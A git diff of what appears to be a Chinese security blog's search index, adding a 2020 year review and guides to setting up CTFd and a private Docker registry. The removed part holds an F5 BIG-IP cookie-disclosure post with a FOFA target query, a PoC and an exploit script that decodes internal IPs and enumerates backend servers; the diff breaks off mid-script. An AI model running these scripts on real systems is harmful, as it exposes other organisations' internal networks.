@@ -46,6 +46,74 @@
 ]]></content>
   </entry>
   <entry>
+    <title>2020-Rj45mp-年度总结</title>
+    <url>/2020-Rj45mp-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>​    队友脱单，我又又又收到了新年第一锤~，前年元旦、去年元旦、今年元旦,习惯了…</p>
+<p>恭喜队友，双丰收，E师傅nb。哈哈哈哈，借队友喜迅开题一下我的2020年度总结。回顾一下，这一年：</p>
+<ol>
+<li><p><strong>生活</strong>：<br> 一塌糊涂，过。终于和2020拜拜了。从1月到4月，全程自闭。然后4月-7月，比赛。7月到12月，工作。<br>比赛和工作没啥好说的。主要是前面几个月，疫情期间在家，差点忧郁症开始了，害~</p>
+<p>过去了也不想再回忆啥，就是在这里，非常感谢在那段时间里愿意深夜听我bb，听我负能量倾诉的那个人，</p>
+<p>希望你好好的，在新大学里，加油加油！        </p>
+</li>
+<li><p><strong>挖洞</strong>：</p>
+<p>主要在SRC上吧，EDUSRC、好未来SRC、顺丰SRC、菜鸟SRC等等，挺久远了的事情，大概在6月份吧。</p>
+<p>主要是反感某些东西，后来就停止了~</p>
+<p>不过今年在挖洞的另一个方面，结交了一帮很好玩的师傅们，自己也加入了某个团队。很幸运遇到各位师傅们，大家在五湖四海，全国各地的，能认识互相师傅来师傅去的，哈哈哈哈，感谢~</p>
+</li>
+<li><p><strong>技术</strong>：</p>
+<p>在技术上，感觉这一年没有很大的提升，整个体系化的积累还是老样子，可能多的就是项目经验上的。</p>
+<p>自我分析了一下，主要在时间管理上吧（有部分原因可能是工作后，自己可控的时间少了），还有就是开太多坑，哈哈哈哈，E神今晚又提醒我一次了。</p>
+<p>太多想整，然后就变成了拖拖拉拉，最后啥也没干成。太真实了~</p>
+<p>这个点后面得想法子解决的，不能再这样了。不然后面落得一地鸡毛，啥也莫得~</p>
+</li>
+<li><p><strong>分享</strong>：</p>
+<p>分享上，这一年，最没有的就是分享。前几月份，决定停止了自己公众号的文章更新。博客上也没有了很多的技术文章，可能接下来还会下架几篇。</p>
+<p>反思了一下，不是很想承认自己懒，主要在这个阶段，其实感觉掌握了一定的搜索能力吧，有的东西，大佬们的都很齐全很完善了，没必要再copy重现一下他们的文章，没有意义，自己需要的是复现和积累的。</p>
+<p>在停更公众号后，我给自己博客定了个更新理念，需要是自己满意的文章，才会上架，这导致了今年文章的产出很低的。（不过幸好，我在自己博客上没开评论和热度这些，哈哈哈哈）</p>
+</li>
+</ol>
+<p>这一年没有啥大风大浪，很多东西在经历时候，感觉它会是我这一年的标志事件，后来发现它不是。到最后能放上总结的，一直都是技术和学习优先，哈哈哈哈~</p>
+<p>给自己的2021年，定一个基调：积累积累再积累！</p>
+<ol>
+<li><p><strong>技术</strong>：</p>
+<p>​        体系化和攻防积累。</p>
+</li>
+<li><p><strong>资质</strong>：</p>
+<p>​        学历提升+安全证书（补票）。</p>
+</li>
+<li><p><strong>生活</strong>：</p>
+<p>​        还是一塌糊涂吧，只要身体健康就好了。</p>
+</li>
+</ol>
+<p>希望自己在新的一年能做好时间管理和落实积累~</p>
+<p><img src="/2020-Rj45mp-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20210101022817245.png" alt="image-20210101022817245"></p>
+<p>2021 ，你好！</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>CTFd的搭建</title>
+    <url>/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<p>会长计划从19届开始在协会组建一支正规的CTF队伍。由于需要训练、比赛和培训等等一系列的过程，并且离开学的时间也比较短了（主要是我太菜，开发能力有限），于是我准备拿CTFd来作为队伍平台，以下为搭建CTFd的过程和优化。</p>
+<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/1.png" alt></p>
+<p>什么是CTFd?<br>官方说法：CTFd是一个Capture The Flag框架，侧重于易用性和可定制性。它提供了运行CTF所需的一切，并且可以使用插件和主题轻松进行自定义。</p>
+<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/2.png" alt></p>
+<h1 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h1><p>采用ubuntu-18.04.1-desktop-amd64。<br>安装过程略。<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/3.png" alt></p>
+<h1 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install ssh -y</span><br><span class="line">sudo apt install vim -y</span><br><span class="line">sudo vim /etc/ssh/sshd_config #编辑配置文件,启用密码</span><br><span class="line">sudo systemctl enable ssh #添加为开机自启动</span><br><span class="line">sudo systemctl start ssh  #启动ssh</span><br></pre></td></tr></table></figure>
+<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/4.png" alt></p>
+<h1 id="更改源"><a href="#更改源" class="headerlink" title="更改源"></a>更改源</h1><p>利用连接工具，连接虚拟机，更改国内源<br>sudo gedit /etc/apt/sources.list</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#添加阿里源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
+<p>更新</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade   #更新所有软件</span><br></pre></td></tr></table></figure>
+<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker.io -y</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo systemctl enable docker #添加为开机自启动</span><br><span class="line">sudo systemctl start docker  #启动docker</span><br><span class="line">注销用户后再重新登陆</span><br></pre></td></tr></table></figure>
+<h1 id="安装CTFd"><a href="#安装CTFd" class="headerlink" title="安装CTFd"></a>安装CTFd</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull ctfd/ctfd</span><br></pre></td></tr></table></figure>
+<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/5.png" alt></p>
+<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/6.png" alt></p>
+<h1 id="运行CTFd"><a href="#运行CTFd" class="headerlink" title="运行CTFd"></a>运行CTFd</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:8000 ctfd/ctfd</span><br></pre></td></tr></table></figure>
+<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/7.png" alt></p>
+<h1 id="优化CTFd-去广告"><a href="#优化CTFd-去广告" class="headerlink" title="优化CTFd(去广告)"></a>优化CTFd(去广告)</h1><p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/8.png" alt><br>配置信息<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/9.png" alt><br>这一部分存在广告，比较不友好。<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/10.png" alt><br>在Admin选项中，点击所有页面<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/11.png" alt><br>在index页面中可以自定义页面源代码。<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/12.png" alt></p>
+]]></content>
+  </entry>
+  <entry>
     <title>ATT&amp;CK初接触</title>
     <url>/ATTCK/</url>
     <content><![CDATA[<h2 id="0x00-ATT-amp-CK"><a href="#0x00-ATT-amp-CK" class="headerlink" title="0x00 ATT&amp;CK"></a>0x00 ATT&amp;CK</h2><h3 id="1、ATT-amp-CK模型"><a href="#1、ATT-amp-CK模型" class="headerlink" title="1、ATT&amp;CK模型"></a>1、ATT&amp;CK模型</h3><p>ATT&amp;CK模型是一套基于历史实战的高级威胁攻击战术的知识库框架。</p>
@@ -314,29 +382,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>CTFd的搭建</title>
-    <url>/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<p>会长计划从19届开始在协会组建一支正规的CTF队伍。由于需要训练、比赛和培训等等一系列的过程，并且离开学的时间也比较短了（主要是我太菜，开发能力有限），于是我准备拿CTFd来作为队伍平台，以下为搭建CTFd的过程和优化。</p>
-<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/1.png" alt></p>
-<p>什么是CTFd?<br>官方说法：CTFd是一个Capture The Flag框架，侧重于易用性和可定制性。它提供了运行CTF所需的一切，并且可以使用插件和主题轻松进行自定义。</p>
-<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/2.png" alt></p>
-<h1 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h1><p>采用ubuntu-18.04.1-desktop-amd64。<br>安装过程略。<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/3.png" alt></p>
-<h1 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install ssh -y</span><br><span class="line">sudo apt install vim -y</span><br><span class="line">sudo vim /etc/ssh/sshd_config #编辑配置文件,启用密码</span><br><span class="line">sudo systemctl enable ssh #添加为开机自启动</span><br><span class="line">sudo systemctl start ssh  #启动ssh</span><br></pre></td></tr></table></figure>
-<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/4.png" alt></p>
-<h1 id="更改源"><a href="#更改源" class="headerlink" title="更改源"></a>更改源</h1><p>利用连接工具，连接虚拟机，更改国内源<br>sudo gedit /etc/apt/sources.list</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#添加阿里源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
-<p>更新</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade   #更新所有软件</span><br></pre></td></tr></table></figure>
-<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker.io -y</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo systemctl enable docker #添加为开机自启动</span><br><span class="line">sudo systemctl start docker  #启动docker</span><br><span class="line">注销用户后再重新登陆</span><br></pre></td></tr></table></figure>
-<h1 id="安装CTFd"><a href="#安装CTFd" class="headerlink" title="安装CTFd"></a>安装CTFd</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull ctfd/ctfd</span><br></pre></td></tr></table></figure>
-<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/5.png" alt></p>
-<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/6.png" alt></p>
-<h1 id="运行CTFd"><a href="#运行CTFd" class="headerlink" title="运行CTFd"></a>运行CTFd</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:8000 ctfd/ctfd</span><br></pre></td></tr></table></figure>
-<p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/7.png" alt></p>
-<h1 id="优化CTFd-去广告"><a href="#优化CTFd-去广告" class="headerlink" title="优化CTFd(去广告)"></a>优化CTFd(去广告)</h1><p><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/8.png" alt><br>配置信息<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/9.png" alt><br>这一部分存在广告，比较不友好。<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/10.png" alt><br>在Admin选项中，点击所有页面<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/11.png" alt><br>在index页面中可以自定义页面源代码。<br><img src="/CTFd%E7%9A%84%E6%90%AD%E5%BB%BA/12.png" alt></p>
-]]></content>
-  </entry>
-  <entry>
     <title>CVE-2016-5195-CentOS65脏牛提权</title>
     <url>/CVE-2016-5195-CentOS65%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>某场比赛的模拟复现。</p>
@@ -410,6 +455,20 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Docker搭建私有仓库</title>
+    <url>/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/</url>
+    <content><![CDATA[<p>通常由于安全和网络原因,企业内部都会在本地局域网搭建一个镜像注册中心。</p>
+<h1 id="下载和运行"><a href="#下载和运行" class="headerlink" title="下载和运行"></a>下载和运行</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull registry</span><br><span class="line">docker run -d -v /home/rj45/MyTest:/var/lib/registry -p 5000:5000 --restart=always --name Myregistry registry</span><br></pre></td></tr></table></figure>
+<p><img src="/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/1.png" alt></p>
+<h1 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">添加：</span><br><span class="line">&quot;insecure-registries&quot;:[&quot;192.168.3.6:5000&quot;]</span><br><span class="line"></span><br><span class="line">重启：</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+<p><img src="/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/2.png" alt></p>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag image_name:tag 192.168.3.6:5000/ubuntu/tag</span><br></pre></td></tr></table></figure>
+<p><img src="/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/3.png" alt></p>
+<p><img src="/Docker%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/4.png" alt></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/fef890c4d1c2" target="_blank" rel="noopener">https://www.jianshu.com/p/fef890c4d1c2</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Dockerfile的编写</title>
     <url>/Dockerfile%E7%9A%84%E7%BC%96%E5%86%99/</url>
     <content><![CDATA[<p>Dockerfile的保留字指令</p>
@@ -438,67 +497,6 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Rj45@mp.com</span><br><span class="line">COPY c.txt /usr/local/cincontainer.txt</span><br><span class="line">ADD apache-tomcat-9.0.8.tar.gz /usr/local</span><br><span class="line">ADD jdk1.8.0_171-linux.tar.gz /usr/local</span><br><span class="line">RUN apt-get install vim -y</span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_171</span><br><span class="line">ENV CLASSPATH $JAVA_HOME/LIB/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.8</span><br><span class="line">ENV CATALIME_BASE /usr/local/apache-tomcat-9.0.8</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line">EXPOSE 8080</span><br><span class="line">#ENTRYPOINT [&quot;/usr/local/apache-tomcat-9.0.8/bin/startup.sh&quot;]</span><br><span class="line">#CMD [&quot;/usr/local/apache-tomcat-9.0.8/bin/catalina.sh&quot;,&quot;run&quot;]</span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.8/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.8/bin/logs/catalina.out</span><br></pre></td></tr></table></figure>
 <p>构建</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -t image_name</span><br></pre></td></tr></table></figure>
-]]></content>
-  </entry>
-  <entry>
-    <title>F5-LTM-leak-intranet-ip</title>
-    <url>/F5-LTM-leak-intranet-ip/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>挺久没更新文章了，一方面是比赛原因，前几天才结束；另一方面也感觉到自己懒惰了下来，希望接下来能恢复一下状态。工作、挖洞、记录和分享…</p>
-<p>在和项目组的C1sr师傅讨论一个漏洞，挺好玩的，第一次遇到，记录一下。</p>
-<p><img src="/F5-LTM-leak-intranet-ip/image-20200724221608608.png" alt="image-20200724221608608"></p>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p> F5 BIG-IP LTM又叫本地流量管理器、 网络负载均衡器、 服务器负载均衡  。</p>
-<p>当然与之现对应的是F5 BIG-IP  GTM， 广域网流量管理 、 全局负载均衡 。</p>
-<p>两者的区别在于LTM负责内网的负载均衡， GTM负责外网的负载均衡。</p>
-<p>如负载均衡， LTM的作用是针对单台服务器的性能瓶颈，通过将请求分配到多个节点服务器上来提高业务的处理能力。</p>
-<p>F5 BIG-IP LTM有两种部署模式，分别是串行和并行部署：</p>
-<p><img src="/F5-LTM-leak-intranet-ip/image-20200724224234395.png" alt="image-20200724224234395"></p>
-<p><img src="/F5-LTM-leak-intranet-ip/image-20200724224526154.png" alt="image-20200724224526154"></p>
-<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>在F5 BIG-IP LTM负载均衡中，为实现请求和应答间的会话保持，F5实现了多种保持机制，其中一种就是通过修改cookie来实现的。</p>
-<p>F5 BIG-IP LTM Cookie保持机制：</p>
-<p>在客户端向F5服务端发起请求时，服务端使用set-cookie给客户端设置一个cookie，</p>
-<p>这个cookie为 BIGipServerpool-name&gt;样式，其内包含了客户端的请求、经过编码的目标服务器ip和port。</p>
-<p>后续第二次收到客户端的请求时，F5服务端会查看该cookie，然后判断应该将该请求发送给哪个下行的服务器，</p>
-<p>从而实现会话的保持。</p>
-<p>通过对cookie的解码，即可泄露出下行服务器的ip和port,甚至获取到整个负载均衡架构的server的ip和port。</p>
-<p>接下来，演示该漏洞的检测和利用过程。</p>
-<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><p><img src="/F5-LTM-leak-intranet-ip/image-20200724231814461.png" alt="image-20200724231814461"></p>
-<p>语法：header=”BIGipServerpool” &amp;&amp; country=”CN”</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> Output,POCBase,register_poc,requests</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BooleanBindPOC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID=<span class="string">'1'</span>;version=<span class="string">''</span>;author=<span class="string">'Rj45mp'</span>;vulDate=<span class="string">''</span>;createDate=<span class="string">''</span>;updateDate=<span class="string">''</span>;references=[<span class="string">''</span>];name=<span class="string">'F5-LTM-leak-intranet-ip'</span></span><br><span class="line">    appPowerLink=<span class="string">''</span>;appName=<span class="string">''</span>;appVersion=<span class="string">''</span>;vulType=<span class="string">''</span>;desc=<span class="string">''</span>;samples=[<span class="string">''</span>];install_requires=[];pocDesc=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result=&#123;&#125;</span><br><span class="line">        payload = <span class="string">"BIGipServerpool"</span></span><br><span class="line">        target=self.url</span><br><span class="line">        req=requests.get(target)</span><br><span class="line">        res=req.cookies</span><br><span class="line">        <span class="keyword">if</span>( payload <span class="keyword">in</span> res) <span class="keyword">and</span> <span class="string">'.0000'</span> <span class="keyword">in</span> res:</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>]=&#123;&#125;</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>]=target</span><br><span class="line">            result[<span class="string">'VerifyInfo'</span>][<span class="string">'payload'</span>]=payload</span><br><span class="line">        <span class="keyword">return</span> self.parse_output</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_output</span><span class="params">(self,result)</span>:</span></span><br><span class="line">        output=Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">'target is not vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">register_poc(BooleanBindPOC)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/F5-LTM-leak-intranet-ip/image-20200725001907479.png" alt="image-20200725001907479"></p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="1、泄露信息"><a href="#1、泄露信息" class="headerlink" title="1、泄露信息"></a>1、泄露信息</h3><p>泄露内网的ip和port，取cookie中的数据<code>1828917420.25627.0000</code>，进行解码，得：</p>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># example string: 110536896.20480.0000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: %s encoded_string"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">encoded_string = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n[*] String to decode: %s\n"</span> % encoded_string</span><br><span class="line"></span><br><span class="line">(host, port, end) = encoded_string.split(<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line">(a, b, c, d) = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> struct.pack(<span class="string">"&lt;I"</span>, int(host))]</span><br><span class="line"></span><br><span class="line">(e) = [ord(e) <span class="keyword">for</span> e <span class="keyword">in</span> struct.pack(<span class="string">"&lt;H"</span>, int(port))]</span><br><span class="line">port = <span class="string">"0x%02X%02X"</span> % (e[<span class="number">0</span>],e[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Decoded Host and Port: %s.%s.%s.%s:%s\n"</span> % (a,b,c,d, int(port,<span class="number">16</span>))</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/F5-LTM-leak-intranet-ip/image-20200725002101319.png" alt="image-20200725002101319"></p>
-<h3 id="2、穷举架构"><a href="#2、穷举架构" class="headerlink" title="2、穷举架构"></a>2、穷举架构</h3><p>在负载均衡中，当大量请求发起并且超过特定的阈值的时，就会把请求下发到其他的server，这时候结合F5 BIG-IP LTM的Cookie保持机制的可拆解性，就有可能获取到整个负载均衡架构的server的ip和port。</p>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment">#import sys</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> netaddr</span><br><span class="line"><span class="keyword">from</span> progress.bar <span class="keyword">import</span> Bar<span class="comment"># as Bar</span></span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Colors</span>:</span></span><br><span class="line">    BLUE 		= <span class="string">'\033[94m'</span></span><br><span class="line">    GREEN 		= <span class="string">'\033[32m'</span></span><br><span class="line">    RED 		= <span class="string">'\033[0;31m'</span></span><br><span class="line">    DEFAULT		= <span class="string">'\033[0m'</span></span><br><span class="line">    ORANGE 		= <span class="string">'\033[33m'</span></span><br><span class="line">    WHITE 		= <span class="string">'\033[97m'</span></span><br><span class="line">    BOLD 		= <span class="string">'\033[1m'</span></span><br><span class="line">    BR_COLOUR 	= <span class="string">'\033[1;37;40m'</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(</span><br><span class="line">					prog=<span class="string">'quickCook.py'</span>,</span><br><span class="line">					description=<span class="string">' [ F5 BIG-IP ] COOKIE INFORMATION DISCLOSURE '</span>, </span><br><span class="line">					epilog=<span class="string">'[+] Demo: quickCook.py --host 192.168.1.1 --cookie-name "BIGipServerPool_X" --req 50'</span>,</span><br><span class="line">					version=<span class="string">"0.2"</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'--host'</span>, 		 dest=<span class="string">"HOST"</span>,  	help=<span class="string">'Host'</span>,			required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--ssl'</span>, 		 dest=<span class="string">"SSL"</span>,  	help=<span class="string">'use ssl'</span>,  		action=<span class="string">"store_true"</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'--cookie-name'</span>, dest=<span class="string">"COOK"</span>,  	help=<span class="string">'Cookie Name'</span>,  	required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--port'</span>, 		 dest=<span class="string">"PORT"</span>,  	help=<span class="string">'Port'</span>,			default=<span class="number">80</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--req'</span>, 		 dest=<span class="string">"REQ"</span>,  	help=<span class="string">'Total Request'</span>,	default=<span class="number">1</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--uri'</span>, 		 dest=<span class="string">"URI"</span>,  	help=<span class="string">'URI path'</span>,	   	default=<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie name</span></span><br><span class="line">args	= 	parser.parse_args()</span><br><span class="line"></span><br><span class="line">HST   	= 	args.HOST</span><br><span class="line">xSSL 	=   args.SSL</span><br><span class="line">port 	= 	args.PORT</span><br><span class="line">cookie 	= 	args.COOK <span class="comment">#  cookie name </span></span><br><span class="line">uPath 	= 	args.URI  <span class="comment"># "index.html"</span></span><br><span class="line">loop 	= 	int(args.REQ)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> xSSL:</span><br><span class="line">	port = <span class="number">443</span></span><br><span class="line">	fullHost 		= 	<span class="string">"https://"</span>+HST+<span class="string">":"</span>+str(port)+<span class="string">"/"</span>+uPath</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	fullHost 		= 	<span class="string">"http://"</span>+HST+<span class="string">":"</span>+str(port)+<span class="string">"/"</span>+uPath</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeReqHeaders</span><span class="params">(host)</span>:</span></span><br><span class="line">	headers = &#123;&#125;</span><br><span class="line">	</span><br><span class="line">	headers[<span class="string">"Host"</span>] 			=  host</span><br><span class="line">	headers[<span class="string">"User-Agent"</span>]		= <span class="string">"Mozilla/5.0 (X11; Linux x86_64; rv:52.1) Gecko/20100101 Firefox/52.0"</span></span><br><span class="line">	headers[<span class="string">"Accept"</span>] 			= <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span> </span><br><span class="line">	headers[<span 